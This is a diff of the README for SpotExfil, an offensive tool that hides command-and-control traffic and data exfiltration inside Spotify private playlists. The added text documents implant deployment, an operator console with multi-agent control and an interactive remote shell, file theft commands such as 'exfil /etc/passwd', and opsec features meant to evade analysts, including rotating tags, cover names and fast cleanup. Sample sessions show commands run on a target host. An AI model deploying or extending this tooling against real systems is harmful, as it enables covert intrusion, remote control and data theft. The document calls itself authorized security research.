@@ -10,14 +10,29 @@ More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amb
 
 ## Features
 
-- **Dual language** -- Python package + standalone Go binary (no runtime needed)
+### Encryption and Opsec
 - **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
-- **Gzip compression** reduces payload size 60-80% for text
+- **Rotating HMAC tags** -- C2 playlist identifiers rotate hourly, preventing long-term traffic correlation
+- **Auto-generated session keys** -- implant generates a NATO-phonetic passphrase on startup (never in argv)
+- **Session binding** -- all commands/results tied to a crypto-random session ID, preventing replay
+- **Timestamp validation** -- commands older than 5 minutes are rejected
+- **HMAC-SHA256 client IDs** -- 64-bit collision-resistant agent identifiers (keyed, unforgeable)
 - **BLAKE2b integrity verification** on encode and decode
-- **Bidirectional C2** with shell, file exfil, and sysinfo modules
-- **Fully encrypted metadata** -- HMAC-derived tags, no plaintext in descriptions
-- **Stealth** -- cover playlist names, random filler tracks, jittered polling, aggressive cleanup
+- **Gzip compression** reduces payload size 60-80% for text
+
+### C2 Framework
+- **Multi-agent support** -- `agents`, `attach <id>`, `detach` for managing multiple implants
+- **Interactive shell** (`ishell`) -- remote shell with command queuing, auto-detects bash/powershell
+- **Direct shell on attach** -- type commands directly when attached (no `shell` prefix needed)
+- **Auto check-in** -- implants announce themselves, operator sees connections in real-time
+- **Modules**: shell (exec commands), exfil (read files), sysinfo (OS/network recon)
+- **Smart rate limiting** -- exponential backoff, human-readable error messages, auto-recovery
+
+### Infrastructure
+- **Dual language** -- Python package + standalone Go binary (no runtime needed)
 - **Cross-platform binaries** -- macOS (Apple Silicon), Linux (x64), Windows (x64), stripped
+- **Stealth** -- cover playlist names, random filler tracks, jittered polling, aggressive cleanup
+- **Config file support** (`~/.spotexfil.conf`) so env vars are optional
 
 ## Architecture
 
@@ -37,9 +52,9 @@ spotexfil/
 │   │   ├── operator.py      # C2 operator console
 │   │   ├── modules/         # Pluggable module registry
 │   │   └── cli.py           # Unified CLI
-│   └── tests/               # 156 tests (unit, integration, stress, interop)
+│   └── tests/               # 156+ tests
 ├── go/                      # Go implementation
-│   ├── cmd/spotexfil/       # Cobra CLI (send/receive/clean/c2-implant/c2-operator)
+│   ├── cmd/spotexfil/       # Cobra CLI
 │   ├── internal/
 │   │   ├── crypto/          # AES-GCM, PBKDF2, BLAKE2b, HMAC
 │   │   ├── encoding/        # File exfil pipeline
@@ -99,76 +114,180 @@ make lint         # Flake8 Python code
 
 ## Usage
 
-### Data Exfiltration
-
-```bash
-# Go binary
-./spotexfil-darwin-arm64 send -f /etc/resolv.conf -k "passphrase"
-./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt
-./spotexfil-darwin-arm64 clean
-
-# Python
-cd python && python -m spotexfil.cli send -f /etc/resolv.conf -k "passphrase"
-cd python && python -m spotexfil.cli receive -k "passphrase"
-```
-
 ### C2 Mode
 
 ```bash
-# Start implant (Go binary on target)
-./spotexfil-darwin-arm64 c2-implant -k "shared-secret" --interval 60 --jitter 30
+# Terminal 1: Start implant (auto-generates session key)
+./spotexfil-darwin-arm64 c2-implant --interval 30 --jitter 10
 
-# Operator console (Python or Go)
-./spotexfil-darwin-arm64 c2-operator -k "shared-secret"
-# OR
-cd python && python -m spotexfil.cli c2-operator -k "shared-secret"
+# Output:
+# [*] Session key: bravo-kilo-seven-echo-tango-lima
+# [*] Use this key to start the operator:
+#     ./spotexfil c2-operator -k "bravo-kilo-seven-echo-tango-lima"
+# [*] Polling every 20-40s
+# [*] Session: a3f2b7c91e04
+# [*] Check-in sent (client_id=7f3a2b1c9e04d8f1) at 15:30:05
+
+# Terminal 2: Operator (use the key shown by implant)
+./spotexfil-darwin-arm64 c2-operator -k "bravo-kilo-seven-echo-tango-lima" --poll-interval 30
+
+# Alternative: key from file or env var
+./spotexfil-darwin-arm64 c2-operator --key-file /path/to/keyfile
+SPOTEXFIL_KEY="bravo-kilo-seven-echo-tango-lima" ./spotexfil-darwin-arm64 c2-operator
 ```
 
-Operator commands:
+### Operator Console
+
 ```
-c2> sysinfo                  # System info from target
-c2> shell uname -a           # Execute shell command
-c2> exfil /etc/passwd        # Exfiltrate a file
-c2> results                  # Poll for results
-c2> wait 1                   # Wait for specific seq
-c2> clean                    # Wipe all C2 playlists
-c2> quit
+  ┌─────────────────────────────────────────────┐
+  │  ___            _   ___       __ _ _        │
+  │ / __|_ __  ___ | |_| __|__ _/ _(_) |       │
+  │ \__ \ '_ \/ _ \|  _| _|\ \ /  _| | |      │
+  │ |___/ .__/\___/ \__|___/_\_\_| |_|_|_|      │
+  │     |_|                                     │
+  │         C2 OPERATOR CONSOLE                 │
+  └─────────────────────────────────────────────┘
+
+  Polling every 30s | Type 'help' for commands
+
+[+] New implant connected!
+    client_id : 7f3a2b1c9e04d8f1
+    session   : a3f2b7c91e04
+    hostname  : target.local
+    os        : darwin/arm64
+    user      : admin
+    timestamp : 2026-04-18 15:30:05
+
+[15:30] c2> agents
+
+  ID               HOSTNAME         OS                   USER       CONNECTED
+  ---------------- ---------------- -------------------- ---------- -------------------
+  7f3a2b1c9e04d8f1 target.local     darwin/arm64         admin      2026-04-18 15:30:05
+
+[15:30] c2> attach 7f3a
+[*] Attached to 7f3a2b1c9e04d8f1 (target.local)
+[15:30] 7f3a2b1c@target.local > whoami
+[*] Command queued: seq=1 module=shell
+[15:30] 7f3a2b1c@target.local > uname -a
+[*] Command queued: seq=2 module=shell
+[15:30] 7f3a2b1c@target.local > sysinfo
+[*] Command queued: seq=3 module=sysinfo
+[15:30] 7f3a2b1c@target.local > results
+[15:30] 7f3a2b1c@target.local > detach
+[*] Detached from 7f3a2b1c9e04d8f1 (target.local)
+[15:31] c2>
 ```
 
-### Cross-Language Interop
+### Interactive Shell (ishell)
 
-Python and Go implementations are wire-compatible. You can mix freely:
-- **Go operator** sends commands to **Python implant**
-- **Python operator** sends commands to **Go implant**
-- File exfil payloads are interchangeable between languages
+```
+[15:31] 7f3a2b1c@target.local > ishell
+
+[*] Interactive shell to target.local (darwin/arm64)
+[*] Shell: bash | Commands queue automatically | 'quit' to exit
+
+7f3a2b1c@target.local $ ls -la /tmp
+  -> queued seq=4
+7f3a2b1c@target.local $ cat /etc/hosts
+  -> queued seq=5
+[queued: 2] 7f3a2b1c@target.local $
+
+$ ls -la /tmp
+drwxrwxrwt  12 root  wheel  384 Apr 18 15:31 .
+...
+
+$ cat /etc/hosts
+127.0.0.1       localhost
+
+7f3a2b1c@target.local $ quit
+[*] Leaving interactive shell
+```
+
+### Available Commands
+
+```
+Agent management:
+  agents          List connected implants
+  attach <id>     Attach to an agent (prefix match, e.g. 'attach 7f3a')
+  detach          Detach from current agent
+
+Commands (when attached, type directly or use prefix):
+  ishell          Interactive remote shell (auto-detects bash/powershell)
+  <any command>   Sent as shell command to attached agent
+  exfil <path>    Exfiltrate a file
+  sysinfo         Gather system info
+
+Other:
+  results         Poll for pending results
+  wait <seq>      Wait for a specific result
+  status          Show agents and pending commands
+  clean           Remove all C2 playlists
+  help            Show this help
+  quit / exit     Exit the console
+```
+
+### Data Exfiltration Mode
+
+```bash
+# Send (encrypted + compressed, cover names)
+./spotexfil-darwin-arm64 send -f /etc/resolv.conf -k "passphrase"
+
+# Receive and decrypt
+./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt
+
+# Clean up
+./spotexfil-darwin-arm64 clean
+```
+
+## Security Model
+
+### Encryption
+- All payloads: AES-256-GCM with PBKDF2-SHA256 (480K iterations)
+- C2 metadata: AES-256-GCM with HMAC-derived fast key (no PBKDF2 per-playlist)
+- Integrity: BLAKE2b-160 hash verified on decode
+
+### Opsec Features
+| Feature | Description |
+|---------|-------------|
+| Rotating tags | C2 playlist identifiers rotate hourly via time-windowed HMAC |
+| Auto-generated keys | Implant generates NATO-phonetic passphrase (never in argv/ps) |
+| Session binding | Crypto-random session ID prevents replay and cross-session leaks |
+| Timestamp validation | Commands older than 5 minutes rejected |
+| HMAC-SHA256 client IDs | 64-bit keyed identifiers (unforgeable without the key) |
+| Aggressive cleanup | Playlists deleted after read by both sides |
+| Cover names | Innocuous playlist names ("Chill Vibes #a3f2") |
+| Jittered polling | Configurable interval + random jitter |
+| Exponential backoff | Smart rate limit handling with auto-recovery |
+| Random OAuth state | No tool fingerprint in OAuth flow |
+
+### What an analyst sees on Spotify
+- Private playlists with names like "Morning Coffee #b7c2"
+- Descriptions are opaque encrypted blobs (HMAC tag + AES-GCM ciphertext)
+- No plaintext metadata, no sequential naming, no detectable patterns
+- Playlists are deleted within seconds of being read
 
 ## Testing
 
 ```bash
-make test         # Run everything (Python 156 tests + Go tests)
+make test         # Run everything (Python 156+ tests + Go tests)
 make test-python  # Python only
 make test-go      # Go only
 make lint         # Flake8
 ```
 
-Test coverage:
-- **Unit**: crypto primitives, encoding pipeline, C2 protocol serialization
-- **Integration**: full C2 roundtrips with in-memory Spotify mock
-- **Stress**: 100+ random payloads, concurrent encoding, edge cases (empty, 1MB, unicode, null bytes)
-- **Interop**: cross-language crypto validation against shared test vectors
-- **Live**: verified against Spotify API (sysinfo C2 roundtrip)
+## Cross-Language Interop
 
-## Shared Protocol
-
-Both implementations load constants from `shared/protocol.json` (Go embeds it at compile time). Wire format is documented in `shared/protocol.json` under `wire_format`. C2 modules are defined in `shared/modules.yaml`.
-
-Cross-language compatibility is enforced by `shared/test_vectors/` containing deterministic KDF, BLAKE2b, AES-GCM, and HMAC test vectors that both test suites validate.
+Python and Go implementations are wire-compatible:
+- **Go operator** sends commands to **Python implant**
+- **Python operator** sends commands to **Go implant**
+- File exfil payloads interchangeable
+- Shared test vectors enforce crypto compatibility
 
 ## Limitations
 
 - ~1MB max payload (~2000 playlists)
 - Slow for large files (1 API call per 512-char chunk)
-- Spotify rate limits may throttle bulk operations
+- Spotify rate limits: ~180 req/30s, write blocks escalate to 24h
 - C2 polling adds latency (configurable, default 30-90s)
 
 ## Disclaimer
@@ -177,7 +296,6 @@ This is a **proof-of-concept for educational and authorized security research pu
 
 ## TODO
 
-- Go OAuth2 PKCE flow for live Spotify auth (currently needs manual token)
 - Account rotation support
 - Additional C2 modules (screenshot, persistence)
 - Multi-account relay / dead drops
